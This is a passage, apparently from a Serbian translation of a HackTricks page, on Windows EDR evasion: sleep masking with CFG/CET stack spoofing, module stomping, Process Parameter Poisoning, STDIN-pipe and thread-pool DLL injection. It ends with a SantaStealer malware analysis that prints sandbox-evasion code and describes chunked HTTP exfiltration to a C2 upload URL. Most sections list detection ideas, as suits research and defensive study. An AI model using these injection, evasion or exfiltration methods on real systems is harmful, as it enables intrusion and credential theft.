- Za ručno mapirane/PIC/stomped regione umesto toga koristi **osnovnu adresu alokacije** i veličinu alokacije.
- Označi ne samo dispatch gadget već i izvezene funkcije do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve izvršne sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Time se ROP/JOP-style sleep chain-ovi pretvaraju iz primitive koja „radi samo u procesima bez CFG-a“ u ponovo upotrebljivu primitivu za `explorer.exe`, pregledače, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a stvara mnogo šuma i može da zakaže na CET Shadow Stack sistemima jer lažirani `Rip` i dalje mora da se poklapa sa hardverskim shadow stack-om. Bezbedniji obrazac za sleep-masking je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj granice njegovog `NT_TIB` / TEB stack-a (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Sačuvaj trenutni pravi TEB/TIB thread-a.
- Uhvatiti pravi sleeping context pomoću `GetThreadContext`.
- Kopiraj **samo** pravi `Rip` u spoof context, ostavljajući lažirani `Rsp`/stack stanje neizmenjenim.
- Tokom sleep perioda kopiraj `NT_TIB` spoof thread-a u trenutni TEB kako bi stack walker-и radili unutar legitimnog opsega stack-a.
- Po završetku čekanja vrati originalni TIB i thread context.

Time se čuva CET-usaglašen instruction pointer, a EDR stack walker-и koji veruju metapodacima TEB stack-a za proveru unwind-a bivaju navedeni na pogrešan trag.

### Alternativa zasnovana na APC-u: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv po potpisu, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ова:<sup>[[27]](#references)</sup>

- Kreiraj pomoćni thread sa `NtTestAlert` kao ulaznom tačkom.
- Stavi pripremljene `CONTEXT` frejmove/APC-ove u red pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Stanje chain-а čuvaj na heap-u umesto na stack-u pomoćnog thread-a kako bi se izbeglo iscrpljivanje podrazumevanog 64 KB thread stack-а.
- Koristi `NtSignalAndWaitForSingleObject` da bi se atomarno signalizovao start event i blokiralo čekanje.
- Suspenduj glavni thread pre vraćanja TIB/context-a (`NtSuspendThread` → vrati → `NtResumeThread`) da bi se smanjio vremenski interval u kom bi skener mogao da zatekne delimično vraćen stack.

Ovim se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom pomoćnog thread/APC-a, uz zadržavanje istih ciljeva RC4 maskiranja i stack-spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` obavijeni oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisivanjima u granice stack-а trenutnog thread-a u TEB/TIB-u.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili pomoćnih funkcija za vraćanje dozvola sekcija.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-и unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload-e iz **`.text` sekcije DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršnu memoriju ili učita novi žrtveni DLL. Cilj prepisivanja treba da bude **učitan, disk-backed image** čiji code prostor može da primi payload bez oštećivanja putanja koda koje su i dalje potrebne procesu.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljenom procesu, a premali code region može da sruši proces. Pouzdaniji postupak je:

1. Nabroj module ciljnog procesa i zadrži **include listu koja sadrži samo imena** već učitanih DLL-ова.
2. Prvo izgradi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ове kandidata na disku i uporedi **`.text` `Misc_VirtualSize`** PE sekcije sa veličinom payload-а. Ovo je važnije od veličine fajla jer odražava veličinu izvršne sekcije **nakon mapiranja в memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni pomeraj za stomping.
5. Izračunaj **blast radius**: ako je payload veći od granice izabrane funkcije, prepisаće susedne izvoze koji se nalaze posle nje u memoriji.

Tipični pomoćni alati za izviđanje/izbor koji su primećeni u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Prednost dajte DLL-ovima koji su **već učitani** u udaljeni proces kako biste izbegli telemetriju koju generišu `LoadLibrary`/neočekivana učitavanja image-a.
- Prednost dajte export-ima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni putevi izvršavanja mogu naići na izmenjene bajtove pre ili posle kreiranja niti.
- Za velike implant-e često je potrebno promeniti ugrađivanje shellcode-a iz string literala u **inicijalizator niza bajtova/u vitičastim zagradama**, kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice koje su podržane image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto u češće privatne RWX/RX alokacije.
- Ulazne tačke export-a čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljene niti ili promene konteksta koje započinju izvršavanje unutar legitimnog DLL export-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje niti.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** koja zaobilazi klasičan put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre poziva `CreateProcessW` u podređeni proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosioci koji se mogu trovanjem izmeniti, a koje kopira `CreateProcessW`

Korisni prenosioci su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograničenja praktične upotrebe prenosilaca:

- `lpCommandLine` mora da pokazuje na **upisivu memoriju** za `CreateProcessW`, a ograničen je na **32.767 Unicode znakova**, uključujući null terminator.
- `lpEnvironment` mora da bude Unicode blok okruženja sastavljen od uzastopnih nizova `NAME=VALUE\0`, završenih dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim dokumentovanim ugovorom.

Time se uobičajeno kreiranje procesa pretvara u **primitiv za prenos payload-a**. Operator kreira podređeni proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez API-ja za udaljeni upis

Nakon kreiranja podređenog procesa, pronađite kopirani bafer pomoću **primitiva samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → preuzmite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 chain je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Učinite izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepišite `RIP`)

Za razliku od klasičnih tokova rada za otmicu niti, za ovo **nije potrebno** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadgledaju zbog ubrizgavanja:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null bajtova i staged shellcode

Sva tri nosioca su **stringovi ili podaci nalik stringovima**, pa se sirovi payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **null-free prva faza** koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da napravi stringove na steku, argumente API-ja, putanje DLL-ova ili loader shellcode-a druge faze, bez ugrađivanja null bajtova u preneti parametar.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži **16-byte** poravnanje `RSP` pre poziva

Druga faza se zatim može kopirati sa steka u alokaciju `PAGE_READWRITE`, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i pokrenuti skokom do nje, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za lov na pretnje:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji postavljaju **stranice parametara procesa kao izvršive**
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti visoke entropije u `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` tokom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalna primitiva za izvršavanje: kopirani parametar i dalje zahteva promenu dozvole za izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su odustali jer se interno oslanja na sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Ubrizgavanje kroz STDIN cev konzole

Interaktivni podređeni proces konzole može se koristiti i kao **primitiva za prenos payload-a**. Injektor preusmerava standardni ulaz podređenog procesa na cev i šalje marker, a zatim shellcode. Nakon što konzolni program pročita podatke u sopствену privatnu memoriju, injektor pronalazi taj bafer, postavlja ga kao izvršiv i preusmerava nit podređenog procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali je ovo i dalje ubrizgavanje u proces, a ne opšti EDR bypass.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, čime se kreira **anonimna cev**. Windows interno implementira anonimne cevi pomoću jedinstveno imenovanih objekata cevi, ali PoC niti bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreiraju se nasledivi handle-ovi sa podrazumevanim deskriptorom bezbednosti, handle za čitanje se postavlja u `STARTUPINFO.hStdInput`, postavlja se `STARTF_USESTDHANDLES`, a zatim se pokreće novi podređeni proces uz omogućeno nasleđivanje handle-ova. Zato ovaj PoC pokreće dostavljeni izvršni fajl konzole; ne povezuje svoju cev sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreiraju se parovi anonimnih cevi za `STDIN` i `STDOUT` podređenog procesa. Isključuje se nasleđivanje za dva handle-a na strani roditelja, a duplikati handle-ova na strani podređenog procesa zatvaraju se u roditelju nakon kreiranja procesa.
2. Pokreće se interaktivni izvršni fajl kao što je `netsh.exe` ili `nslookup.exe` pomoću `CREATE_NEW_CONSOLE`. Podređeni proces nasleđuje preusmerene standardne handle-ove.
3. Ceo binarni niz `rawData` šalje se pomoću `WriteFile` kroz handle za `STDIN` na strani roditelja. Konzolni program preuzima bajtove i ostavlja njihovu kopiju u jednoj od svojih privatnih potvrđenih memorijskih oblasti.
4. Prolazi se kroz adresni prostor podređenog procesa pomoću `VirtualQueryEx`, čitaju se kandidatske oblasti `MEM_PRIVATE` pomoću `ReadProcessMemory` i traži se marker na početku niza `rawData`.
5. Pronađeni bafer se menja u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Identifikuje se glavna nit, ona se suspenduje, `RIP` se postavlja na `found_address + 0x19` pomoću `NtSetContextThread`, a zatim se nit nastavlja.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostavljena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom ofsetu `0x19`. Pri zameni payload-a sačuvajte taj raspored ili zajedno ažurirajte marker, vektor pretrage, veličinu niza i ofset izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao nepoželjne znakove. Ovaj postupak ne menja token ni privilegije child procesa.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce za kompajliranje payload-a pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Injektovanje DLL-a pomoću callback-a thread pool-a, bez shellcode-a (DLLParty)

DLLParty prilagođava injektovanje u thread pool u stilu PoolParty tako da postojeći worker ciljnog procesa pozove `LoadLibraryA`, umesto da izvrši injektovani callback stub. Njegov mehanizam za dispatch je `TP_DIRECT` completion koji se stavlja u red čekanja I/O completion port-a ciljnog procesa. Time se ne zaobilaze dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i potrebni su mu memorija ciljnog procesa koja može da se čita i upisuje, kao i handle-ovi worker factory-ja i completion port-a koji mogu da se dupliciraju.<sup>[[46]](#references)[[47]](#references)</sup>

Na Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE`, smešten na steku, u `RCX` — prvom callback argumentu. `LoadLibraryA` tumači taj isti pokazivač kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` postavlja pokazivač na `RSP+0x178`, dok se prvi uobičajeni upis u taj objekat obavlja na `RSP+0x1d0`. Zato putanja DLL-a sa završnim null znakom, koja staje u ovaj prefiks od 0x58 bajtova, može da se smesti na početak instance, a da ne bude prepisana pre dispatch-a. Ovo je zapažanje specifično za određenu verziju sistema, a ne dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni postupak je sledeći:<sup>[[46]](#references)[[47]](#references)</sup>

1. Nabrojte handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` ispitivanjem tipova objekata. Duplirajte handle worker factory-ja i pozovite `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-je kod kojih je `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a pool-a. Na testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), glava liste je na `pool+0x60`; svaka veza je na `worker+0x10`, pa je slot callback instance na `worker+0x38` jednak `link+0x28`. PoC proverava poravnanje pokazivača, uzajamnu povezanost veza, pripadnost pool-u, ID-jeve niti različite od nule, ponovljene čvorove i stabilnost glave liste.
3. Upišite putanju DLL-a u **svaki** pronađeni worker slot jer completion iz reda može da preuzme bilo koji worker. Smestite `TP_DIRECT` sa `Callback = LoadLibraryA` u memoriju ciljnog procesa koja može da se upisuje. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj ofset je eksperimentalan i ne sme da se preklapa sa aktivnim podacima na steku.
4. Duplirajte handle completion port-a ciljnog procesa i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je completion key. Postojeći worker zatim poziva `LoadLibraryA` sa prepisanim pokazivačem callback instance i učitava DLL kojoj ciljni proces već može da pristupi.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hardkodovanu putanju DLL-a u `DLLParty.cpp`; pre kompajliranja x64 izvršne datoteke postavite putanju kojoj ciljni proces može da pristupi. Takođe koristi adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da je ta adresa važeća i u ciljnom procesu. Kod ne proverava da li je putanja kraća od prefiksa od 0x58 bajtova niti da li je obilazak worker-a pronašao slot pre indeksiranja poslednjeg elementa. Ponovo proverite privatne ofsete, raspored steka i prostor za upis za konkretnu verziju sistema. Izostavljanje `CreateRemoteThreadEx`, shellcode-a i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktike SantaStealer-a za izbegavanje detekcije bez datoteka i krađu akreditiva

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni kradljivci informacija objedinjuju zaobilaženje AV-a, zaštitu od analize i pristup akreditivima u jednom postupku.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak kreira prazan marker `CIS` i prekida rad pre pokretanja kradljivaca, čime se osigurava da se nikada ne aktivira u isključenim lokalizacijama, a pritom ostavlja artefakt koristan za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenom kliznom kontrolnom sumom i upoređuje je sa ugrađenim listama blokiranih naziva debugger-a/sandbox okruženja; ponavlja izračunavanje kontrolne sume nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox dodatke i obavlja vremenske provere oko pauza kako bi uočila izvršavanje korak po korak. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni program + dvostruko ChaCha20 reflektivno učitavanje

- Primarni DLL/EXE sadrži Chromium помоћни програм за прикупљање акредитива, који се или уписује на диск или ручно мапира у меморију; у fileless режиму сам разрешава увозе и релокације, тако да се не уписују никакви артефакти помоћног програма.
- Тај помоћни програм чува DLL друге фазе, двапут шифрован ChaCha20 алгоритмом (два кључа од 32 бајта + nonce вредности од 12 бајтова). После оба пролаза, рефлективно учитава blob (без `LoadLibrary`) и позива извозе `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` изведене из пројекта [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Рутине ChromElevator користе рефлективни process hollowing заснован на direct syscall-овима како би убациле код у активан Chromium прегледач, наследиле кључеве AppBound Encryption и дешифровале лозинке/колачиће/платне картице директно из SQLite база података, упркос ABE заштити.

### Модуларно прикупљање у меморији и HTTP ексфилтрација у деловима

- `create_memory_based_log` пролази кроз глобалну табелу показивача на функције `memory_generators` и покреће по једну нит за сваки омогућени модул (Telegram, Discord, Steam, снимци екрана, документи, екстензије прегледача итд.). Свака нит уписује резултате у заједничке бафере и пријављује број датотека након периода придруживања од око 45 секунди.
- Када се заврши, све се компресује помоћу статички повезане библиотеке `miniz` у `%TEMP%\\Log.zip`. `ThreadPayload1` затим чека 15 секунди и шаље архиву у деловима од 10 MB путем HTTP POST захтева на `http://<C2>:6767/upload`, лажно представљајући `multipart/form-data` граничник прегледача (`----WebKitFormBoundary***`). Сваки део садржи `User-Agent: upload`, `auth: <build_id>`, опционално `w: <campaign_tag>`, а последњи део додаје `complete: true` како би C2 знао да је поновно састављање завршено.

## References

- [1] [Напредне тактике избегавања: прецизно гажење модула](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стекови позива: нема више бесплатног пролаза за малвер](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документација](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – пример](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – пример](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC за лажирање стека позива](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Нови ланац инфекције и обфускација заснована на ConfuserEx-у за крадљивца DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Треба ли веровати свом Zero Trust-у? Заобилажење Zscaler провера безбедносног стања](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Пре ToolShell-а: Истраживање ранијих ransomware операција групе Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: злоупотреба прослеђених извоза](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Инвентар прослеђених извоза у Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Редослед претраживања библиотека са динамичким повезивањем](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безбедност процеса и права приступа](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Референца за EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Покретач CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Супротстављање EDR-овима уз подршку Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Пробијање заштитне љуске Windows Defender-а техником преусмеравања фасцикле](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Референца за команду mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Иза завесе Pure: од RAT-а преко билдера до кодера](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer стиже у град: нови, амбициозни крадљивац информација](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Дешифровање Chrome App Bound Encryption-а](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: откривање малвера Node.js праћењем API-ја](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Успавана лепотица: успављивање Adaptix-а помоћу Crystal Palace-а](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Тровање параметара процеса](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Успавана лепотица II: CFG, CET и лажирање стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko обфускација спавања](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Скривање Dotnet ETW-а](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Злоупотреба Chrome Remote Desktop-а у Red Team операцијама: практични водич](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: претварање Defender-овог драјвера за санацију у примитив за операције у kernel-у](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Пратећи код за MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: израда функција које саме себе маскирају помоћу LLVM-а](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – изворни код InjectSetConsole-а](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Функција CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Креирање подређеног процеса са преусмереним улазом и излазом](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: поновно обликовање C# алата помоћу WasmForge-а](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – Компилација C# / .NET пројеката](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept и изворни код](https://github.com/epersic/DLLParty)
- [47] [DLLParty — злоупотреба интерних механизама thread pool-а за DLL инјекцију без shellcode-а](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
